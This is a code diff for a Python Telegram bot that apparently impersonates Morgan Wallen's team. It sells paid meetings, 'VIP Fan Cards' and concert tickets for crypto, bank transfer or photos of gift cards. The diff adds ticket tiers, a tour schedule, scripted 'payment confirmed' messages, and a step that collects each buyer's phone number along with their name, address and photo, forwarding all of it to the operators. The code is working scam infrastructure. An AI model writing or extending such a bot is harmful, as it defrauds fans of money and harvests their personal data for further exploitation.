@@ -44,7 +44,7 @@ except: pass
 try: cursor.execute("ALTER TABLE wallets ADD COLUMN guide TEXT")
 except: pass
 
-# --- NEW VIP COLUMNS ---
+# --- VIP COLUMNS ---
 try: cursor.execute("ALTER TABLE settings ADD COLUMN price_vip INTEGER DEFAULT 3500")
 except: pass
 try: cursor.execute("ALTER TABLE settings ADD COLUMN vip_app_msg TEXT")
@@ -52,8 +52,24 @@ except: pass
 try: cursor.execute("ALTER TABLE settings ADD COLUMN vip_rej_msg TEXT")
 except: pass
 
+# --- TOUR AND TICKETS COLUMNS ---
+try: cursor.execute("ALTER TABLE settings ADD COLUMN price_t_normal INTEGER DEFAULT 500")
+except: pass
+try: cursor.execute("ALTER TABLE settings ADD COLUMN price_t_vip INTEGER DEFAULT 1000")
+except: pass
+try: cursor.execute("ALTER TABLE settings ADD COLUMN tour_info TEXT")
+except: pass
+try: cursor.execute("ALTER TABLE settings ADD COLUMN ticket_app_msg TEXT")
+except: pass
+try: cursor.execute("ALTER TABLE settings ADD COLUMN ticket_rej_msg TEXT")
+except: pass
+
 default_app = "🎉 **Payment Confirmed Successfully**\n\n━━━━━━━━━━━━━━━━━━\n👑 **VIP CONFIRMATION NOTICE**\n━━━━━━━━━━━━━━━━━━\n\nDear User,\n\nYour payment has been successfully verified. Your exclusive meeting with **Morgan Wallen** is now officially scheduled.\n\n📅 **Scheduled Date:** {date}\n\n🎫 **VIP Recognition Card:**\nA VIP Fan Card will be issued as your official form of recognition and identification for the meeting. This card will be prepared and shipped to you within the next **2 days**.\n\n📦 **Shipping & Delivery:**\nPersonal details such as your **Full Name, Shipping Address, and Phone Number** must be provided by you once the card is ready for dispatch to ensure a secure delivery.\n\nThank you for your trust. We look forward to delivering a premium experience.\n\n━━━━━━━━━━━━━━━━━━\nStatus: **CONFIRMED ✅**"
-default_vip_app = "🎉 **VIP Fan Card Payment Confirmed**\n\nYour payment for the exclusive VIP Fan Card has been successfully verified! ✅\n\nTo proceed with production and shipping, we require a few details."
+default_vip_app = "🎉 **VIP Fan Card Payment Confirmed**\n\nYour payment for the exclusive VIP Fan Card has been successfully verified! ✅\n\nTo proceed with production and shipping, we require a few details.\nName \nAddress \nPhone number"
+default_tour = "🎸 **Morgan Wallen - One Night At A Time Tour**\n\nUpcoming Dates:\n📍 April 15 - Indianapolis, IN (Lucas Oil Stadium)\n📍 April 20 - Oxford, MS (Vaught-Hemingway Stadium)\n📍 May 2 - Nashville, TN (Nissan Stadium)\n📍 May 9 - Hershey, PA (Hersheypark Stadium)\n\n*(More dates to be announced...)*"
+default_ticket_app = "🎉 **Ticket Payment Confirmed**\n\nCongratulations! Your payment has been successfully verified. You have been granted an official ticket to Morgan Wallen's exclusive concert. Prepare for an unforgettable experience!\n\nYour digital access details and venue instructions will be sent to you shortly. ✅"
+default_ticket_rej = "❌ **Ticket Payment Rejected**\n\nWe were unable to verify your payment for the concert ticket. If you believe this is an error, please ensure your transaction was completed correctly and contact support."
+
 cursor.execute("INSERT OR IGNORE INTO settings (id, price_meet, price_biz, app_msg, price_vip, vip_app_msg, vip_rej_msg) VALUES (1, 15000, 20000, ?, 3500, ?, '❌ VIP Card Payment Rejected.')", (default_app, default_vip_app))
 conn.commit()
 
@@ -61,6 +77,12 @@ conn.commit()
 cursor.execute("UPDATE settings SET price_vip = 3500 WHERE price_vip IS NULL")
 cursor.execute("UPDATE settings SET vip_app_msg = ? WHERE vip_app_msg IS NULL", (default_vip_app,))
 cursor.execute("UPDATE settings SET vip_rej_msg = '❌ VIP Card Payment Rejected.' WHERE vip_rej_msg IS NULL")
+
+cursor.execute("UPDATE settings SET price_t_normal = 500 WHERE price_t_normal IS NULL")
+cursor.execute("UPDATE settings SET price_t_vip = 1000 WHERE price_t_vip IS NULL")
+cursor.execute("UPDATE settings SET tour_info = ? WHERE tour_info IS NULL", (default_tour,))
+cursor.execute("UPDATE settings SET ticket_app_msg = ? WHERE ticket_app_msg IS NULL", (default_ticket_app,))
+cursor.execute("UPDATE settings SET ticket_rej_msg = ? WHERE ticket_rej_msg IS NULL", (default_ticket_rej,))
 conn.commit()
 
 def get_wallet(coin):
@@ -69,11 +91,11 @@ def get_wallet(coin):
     return row if row else ("NOT SET", None)
 
 def get_prices():
-    cursor.execute("SELECT price_meet, price_biz, price_vip FROM settings WHERE id=1")
+    cursor.execute("SELECT price_meet, price_biz, price_vip, price_t_normal, price_t_vip FROM settings WHERE id=1")
     res = cursor.fetchone()
     if res:
-        return res[0], res[1], (res[2] if res[2] is not None else 3500)
-    return 15000, 20000, 3500
+        return res[0], res[1], (res[2] if res[2] is not None else 3500), (res[3] if res[3] is not None else 500), (res[4] if res[4] is not None else 1000)
+    return 15000, 20000, 3500, 500, 1000
 
 def is_blocked(user_id):
     cursor.execute("SELECT blocked FROM users WHERE user_id=?", (user_id,))
@@ -109,7 +131,8 @@ async def send_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, is_
     
     keyboard = [
         [InlineKeyboardButton("🎯 Book Meeting", callback_data="book")],
-        [InlineKeyboardButton("🎫 VIP Fan Card", callback_data="vip_card")]
+        [InlineKeyboardButton("🎫 VIP Fan Card", callback_data="vip_card")],
+        [InlineKeyboardButton("🎸 Tour & Tickets", callback_data="tour_menu")]
     ]
     if is_admin(user_id):
         keyboard.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
@@ -155,7 +178,8 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
               [InlineKeyboardButton("💬 DM User", callback_data="dm_user"), InlineKeyboardButton("🚫 Block Manager", callback_data="block_mgmt")],
               [InlineKeyboardButton("✅ Edit Meet Appr", callback_data="set_app_msg"), InlineKeyboardButton("❌ Edit Meet Rej", callback_data="set_rej_msg")],
               [InlineKeyboardButton("🌟 Edit VIP Appr", callback_data="set_vip_app"), InlineKeyboardButton("🌟 Edit VIP Rej", callback_data="set_vip_rej")],
-              [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")]]
+              [InlineKeyboardButton("🎸 Edit Ticket Appr", callback_data="set_ticket_app"), InlineKeyboardButton("🎸 Edit Ticket Rej", callback_data="set_ticket_rej")],
+              [InlineKeyboardButton("📅 Edit Tour Info", callback_data="set_tour_info"), InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")]]
         
         admin_info = f"📊 **Admin Panel**\n👤 Admin ID: `{user_id}`\n👥 Total Users: `{total_users}`\n🚫 Blocked Users: `{blocked_users}`"
         await query.edit_message_text(admin_info, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
@@ -187,6 +211,18 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "set_vip_rej" and is_admin(user_id):
         context.user_data["step"] = "setting_vip_rej"
         await query.edit_message_text("📥 Send new VIP Fan Card Rejection Message:")
+        
+    elif data == "set_ticket_app" and is_admin(user_id):
+        context.user_data["step"] = "setting_ticket_app"
+        await query.edit_message_text("📥 Send new Tour Ticket Approval Message:")
+        
+    elif data == "set_ticket_rej" and is_admin(user_id):
+        context.user_data["step"] = "setting_ticket_rej"
+        await query.edit_message_text("📥 Send new Tour Ticket Rejection Message:")
+        
+    elif data == "set_tour_info" and is_admin(user_id):
+        context.user_data["step"] = "setting_tour_info"
+        await query.edit_message_text("📥 Send the updated Morgan Wallen Tour Schedule text:")
 
     elif data == "wallet_menu" and is_admin(user_id):
         kb = [[InlineKeyboardButton("BTC", callback_data="manage_BTC"), InlineKeyboardButton("ETH", callback_data="manage_ETH")],
@@ -195,10 +231,12 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("Select asset to edit:", reply_markup=InlineKeyboardMarkup(kb))
 
     elif data == "edit_prices" and is_admin(user_id):
-        p_meet, p_biz, p_vip = get_prices()
+        p_meet, p_biz, p_vip, p_tnormal, p_tvip = get_prices()
         kb = [[InlineKeyboardButton(f"Meet & Greet (${p_meet})", callback_data="setp_meet")],
               [InlineKeyboardButton(f"Business (${p_biz})", callback_data="setp_biz")],
               [InlineKeyboardButton(f"VIP Card (${p_vip})", callback_data="setp_vip")],
+              [InlineKeyboardButton(f"Normal Ticket (${p_tnormal})", callback_data="setp_tnormal")],
+              [InlineKeyboardButton(f"VIP Ticket (${p_tvip})", callback_data="setp_tvip")],
               [InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]
         await query.edit_message_text("Select price to update:", reply_markup=InlineKeyboardMarkup(kb))
 
@@ -276,9 +314,9 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         await query.message.reply_text(guide_text, parse_mode="Markdown")
 
-    # USER UI
+    # USER UI - BOOKING
     elif data == "book":
-        p_meet, p_biz, _ = get_prices()
+        p_meet, p_biz, _, _, _ = get_prices()
         kb = [[InlineKeyboardButton(f"Meet & Greet (${p_meet})", callback_data="type_meet")], 
               [InlineKeyboardButton(f"Business (${p_biz})", callback_data="type_business")],
               [InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")]]
@@ -290,16 +328,47 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         kb = [[InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")]]
         await query.edit_message_text("Send your reason for the meeting:", reply_markup=InlineKeyboardMarkup(kb))
         
+    # USER UI - VIP FAN CARD
     elif data == "vip_card":
-        _, _, p_vip = get_prices()
+        _, _, p_vip, _, _ = get_prices()
         context.user_data["meeting_type"] = "VIP Fan Card"
         context.user_data["step"] = None
         
-        kb = [[InlineKeyboardButton("💳 Proceed to Payment", callback_data="proceed_vip_pay")],
+        kb = [[InlineKeyboardButton("💳 Proceed to Payment", callback_data="proceed_payment")],
               [InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")]]
         await query.edit_message_text(f"🎫 **VIP Fan Card**\n\nSecure your exclusive recognition as a verified VIP.\n\n**Price:** ${p_vip}", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
 
-    elif data == "proceed_vip_pay":
+    # USER UI - TOUR & TICKETS
+    elif data == "tour_menu":
+        kb = [[InlineKeyboardButton("🎫 Ticket Options", callback_data="tour_tickets")],
+              [InlineKeyboardButton("📅 Updated Morgan Wallen Tour", callback_data="tour_info_show")],
+              [InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")]]
+        await query.edit_message_text("🎸 **Tour & Tickets**\n\nSelect an option to proceed:", reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data == "tour_info_show":
+        cursor.execute("SELECT tour_info FROM settings WHERE id=1")
+        row = cursor.fetchone()
+        info_text = row[0] if row and row[0] else default_tour
+        kb = [[InlineKeyboardButton("⬅️ Back", callback_data="tour_menu")]]
+        await query.edit_message_text(info_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+
+    elif data == "tour_tickets":
+        _, _, _, p_tnormal, p_tvip = get_prices()
+        kb = [[InlineKeyboardButton(f"Normal Ticket (${p_tnormal})", callback_data="type_t_normal")],
+              [InlineKeyboardButton(f"VIP Ticket (${p_tvip})", callback_data="type_t_vip")],
+              [InlineKeyboardButton("⬅️ Back", callback_data="tour_menu")]]
+        await query.edit_message_text("Select your ticket type:", reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data in ["type_t_normal", "type_t_vip"]:
+        context.user_data["meeting_type"] = "Normal Ticket" if data == "type_t_normal" else "VIP Ticket"
+        context.user_data["step"] = None
+        # Route directly to the standard payment selection menu
+        query.data = "proceed_payment"
+        await buttons(update, context)
+        return
+
+    # PAYMENT SECTION 
+    elif data == "proceed_payment":
         kb = [[InlineKeyboardButton("BTC", callback_data="pay_BTC"), InlineKeyboardButton("ETH", callback_data="pay_ETH")], 
               [InlineKeyboardButton("USDT", callback_data="pay_USDT"), InlineKeyboardButton("Bank", callback_data="pay_Bank")],
               [InlineKeyboardButton("🎁 Gift Card", callback_data="pay_GiftCard")],
@@ -315,7 +384,8 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["step"] = "waiting_gift_card"
         m_type = context.user_data.get("meeting_type", "Meet & Greet")
         
-        kb = [[InlineKeyboardButton("⬅️ Back", callback_data="proceed_vip_pay" if m_type == "VIP Fan Card" else "main_menu")]]
+        back_btn = "tour_menu" if "Ticket" in m_type else "main_menu"
+        kb = [[InlineKeyboardButton("⬅️ Back", callback_data=back_btn)]]
         await query.edit_message_text("🎁 **Gift Card Payment**\n\nPlease send/upload a clear, highly visible photo of your Gift Card now. You can send multiple cards if necessary.", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
 
     elif data.startswith("pay_"):
@@ -329,10 +399,12 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await context.bot.send_message(chat_id=admin, text=f"💳 **Activity Alert**\nUser: `{user_id}`\nAction: Viewing {coin} payment option\nType: {m_type}", parse_mode="Markdown")
                 except: pass
 
-        p_meet, p_biz, p_vip = get_prices()
+        p_meet, p_biz, p_vip, p_tnormal, p_tvip = get_prices()
         if m_type == "Meet & Greet": price = p_meet
         elif m_type == "Business": price = p_biz
-        else: price = p_vip
+        elif m_type == "VIP Fan Card": price = p_vip
+        elif m_type == "Normal Ticket": price = p_tnormal
+        else: price = p_tvip
         
         addr, memo = get_wallet(coin)
 
@@ -352,7 +424,7 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "confirm_payment":
         reason = context.user_data.get("reason_text", "N/A")
         m_type = context.user_data.get("meeting_type", "Meet & Greet")
-        t_code = "V" if m_type == "VIP Fan Card" else "M"
+        t_code = "V" if m_type == "VIP Fan Card" else ("T" if "Ticket" in m_type else "M")
         
         for admin in ADMIN_IDS:
             kb = [[InlineKeyboardButton("✅ Approve", callback_data=f"app_{user_id}_{t_code}"),
@@ -368,14 +440,20 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if t_code == "V":
             cursor.execute("SELECT vip_app_msg FROM settings WHERE id=1")
             row = cursor.fetchone()
-            msg = row[0] if row and row[0] else "✅ VIP Payment Confirmed."
+            msg = row[0] if row and row[0] else default_vip_app
             await context.bot.send_message(chat_id=target, text=msg, parse_mode="Markdown")
             
-            # Init User Data Gathering sequence safely via global dict reference structure context approach
+            # Start User Details Prompt Chain
             context.application.user_data.setdefault(target, {})["step"] = "vip_ask_name"
-            await context.bot.send_message(chat_id=target, text="👤 Please reply with your **Full Name** exactly as it should appear on the VIP Card:", parse_mode="Markdown")
             await query.edit_message_text(f"✅ VIP Approved for {target}. User is currently being prompted for their details.")
             
+        elif t_code == "T":
+            cursor.execute("SELECT ticket_app_msg FROM settings WHERE id=1")
+            row = cursor.fetchone()
+            msg = row[0] if row and row[0] else default_ticket_app
+            await context.bot.send_message(chat_id=target, text=msg, parse_mode="Markdown")
+            await query.edit_message_text(f"✅ Ticket Approved for {target}")
+
         else:
             cursor.execute("SELECT app_msg FROM settings WHERE id=1")
             row = cursor.fetchone()
@@ -393,6 +471,10 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
             cursor.execute("SELECT vip_rej_msg FROM settings WHERE id=1")
             row = cursor.fetchone()
             txt = row[0] if row and row[0] else "❌ VIP Payment Rejected."
+        elif t_code == "T":
+            cursor.execute("SELECT ticket_rej_msg FROM settings WHERE id=1")
+            row = cursor.fetchone()
+            txt = row[0] if row and row[0] else "❌ Ticket Payment Rejected."
         else:
             cursor.execute("SELECT rej_msg FROM settings WHERE id=1")
             row = cursor.fetchone()
@@ -445,9 +527,26 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             conn.commit(); context.user_data["step"] = None
             await update.message.reply_text("✅ VIP Fan Card Rejection Message updated!")
 
+        elif step == "setting_ticket_app":
+            cursor.execute("UPDATE settings SET ticket_app_msg = ? WHERE id = 1", (text,))
+            conn.commit(); context.user_data["step"] = None
+            await update.message.reply_text("✅ Tour Ticket Approval Message updated!")
+
+        elif step == "setting_ticket_rej":
+            cursor.execute("UPDATE settings SET ticket_rej_msg = ? WHERE id = 1", (text,))
+            conn.commit(); context.user_data["step"] = None
+            await update.message.reply_text("✅ Tour Ticket Rejection Message updated!")
+
+        elif step == "setting_tour_info":
+            cursor.execute("UPDATE settings SET tour_info = ? WHERE id = 1", (text,))
+            conn.commit(); context.user_data["step"] = None
+            await update.message.reply_text("✅ Tour Info updated!")
+
         elif step and step.startswith("setp_"):
             if "meet" in step: field = "price_meet"
             elif "biz" in step: field = "price_biz"
+            elif "tnormal" in step: field = "price_t_normal"
+            elif "tvip" in step: field = "price_t_vip"
             else: field = "price_vip"
             
             cursor.execute(f"UPDATE settings SET {field} = ? WHERE id = 1", (int(text),))
@@ -484,12 +583,17 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if step == "vip_ask_name":
         context.user_data["vip_name"] = text
         context.user_data["step"] = "vip_ask_address"
-        await update.message.reply_text("📦 Excellent. Now, please reply with your **Full Shipping Address**:")
+        await update.message.reply_text("📦 Excellent. Now, please reply with your **Full Shipping Address**:", parse_mode="Markdown")
         
     elif step == "vip_ask_address":
         context.user_data["vip_address"] = text
+        context.user_data["step"] = "vip_ask_phone"
+        await update.message.reply_text("📱 Great. Now, please provide your **Phone Number**:", parse_mode="Markdown")
+
+    elif step == "vip_ask_phone":
+        context.user_data["vip_phone"] = text
         context.user_data["step"] = "vip_ask_photo"
-        await update.message.reply_text("📸 Perfect. Finally, please upload a clear, **Professional Picture** of yourself that will be printed onto your VIP Fan Card:")
+        await update.message.reply_text("📸 Perfect. Finally, please upload a clear, **Professional Picture** of yourself that will be printed onto your VIP Fan Card:", parse_mode="Markdown")
 
     elif step == "reason":
         context.user_data["reason_text"] = text
@@ -505,7 +609,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await update.message.reply_text(payment_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
     
-    elif not is_admin(user_id) and step not in ["vip_ask_name", "vip_ask_address"]:
+    elif not is_admin(user_id) and step not in ["vip_ask_name", "vip_ask_address", "vip_ask_phone"]:
         for admin in ADMIN_IDS:
             kb = [[InlineKeyboardButton("↩️ Reply", callback_data=f"reply_{user_id}")]]
             await context.bot.send_message(chat_id=admin, text=f"📩 **Message from {user_id}**\n\n💬 {text}", reply_markup=InlineKeyboardMarkup(kb))
@@ -521,7 +625,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if step == "waiting_gift_card":
         m_type = context.user_data.get("meeting_type", "Meet & Greet")
-        t_code = "V" if m_type == "VIP Fan Card" else "M"
+        t_code = "V" if m_type == "VIP Fan Card" else ("T" if "Ticket" in m_type else "M")
         
         for admin in ADMIN_IDS:
             kb = [[InlineKeyboardButton("✅ Approve Payment", callback_data=f"app_{user_id}_{t_code}"),
@@ -536,12 +640,13 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         name = context.user_data.get("vip_name", "N/A")
         address = context.user_data.get("vip_address", "N/A")
+        phone = context.user_data.get("vip_phone", "N/A")
         
         for admin in ADMIN_IDS:
             await context.bot.send_photo(
                 chat_id=admin, 
                 photo=photo_file, 
-                caption=f"🎫 **New VIP Fan Card Details Submitted**\n\n👤 **User ID:** `{user_id}`\n📝 **Name:** {name}\n📍 **Address:** {address}", 
+                caption=f"🎫 **New VIP Fan Card Details Submitted**\n\n👤 **User ID:** `{user_id}`\n📝 **Name:** {name}\n📍 **Address:** {address}\n📱 **Phone:** {phone}", 
                 parse_mode="Markdown"
             )
         
@@ -557,6 +662,6 @@ if __name__ == "__main__":
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(buttons))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    app.add_handler(MessageHandler(filters.PHOTO, handle_photo)) # New handler for images
+    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     threading.Thread(target=lambda: server.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
     app.run_polling(drop_pending_updates=True)
